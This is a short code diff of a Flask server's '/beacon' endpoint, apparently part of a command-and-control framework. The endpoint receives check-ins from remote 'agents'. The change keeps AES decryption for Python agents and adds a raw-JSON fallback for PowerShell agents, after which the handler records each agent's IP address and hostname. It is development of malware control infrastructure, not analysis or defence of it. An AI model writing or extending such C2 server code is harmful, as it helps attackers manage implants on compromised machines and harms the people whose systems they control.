@@ -256,17 +256,16 @@ def register_aes_key():
 @app.route('/beacon', methods=['POST'])
 def beacon():
     encrypted = request.data.decode()
+    from utils.crypto import aes_decrypt
 
-    from utils.crypto import aes_decrypt  # ensure you import the right one
     data = None
     client_id_match = None
 
+    # Attempt AES decryption (for Python agents)
     for client_id, aes_key in aes_keys_by_client_id.items():
         try:
             decrypted = aes_decrypt(encrypted, aes_key)
             parsed = json.loads(decrypted)
-
-            # Check if the decrypted data contains the correct client_id
             if parsed.get("client_id") == client_id:
                 data = parsed
                 client_id_match = client_id
@@ -274,9 +273,14 @@ def beacon():
         except Exception:
             continue
 
+    # If AES decryption failed, try raw JSON (for PS agents)
     if not data:
-        print("[!] Failed to decrypt beacon with any known AES key.")
-        return "Decryption failed", 403
+        try:
+            data = request.get_json()
+            client_id_match = "powershell"  # fallback tag
+        except Exception as e:
+            print("[!] Failed to parse raw JSON beacon:", e)
+            return "Decryption failed", 403
 
     ip = request.remote_addr
     hostname = data.get('hostname', 'unknown')
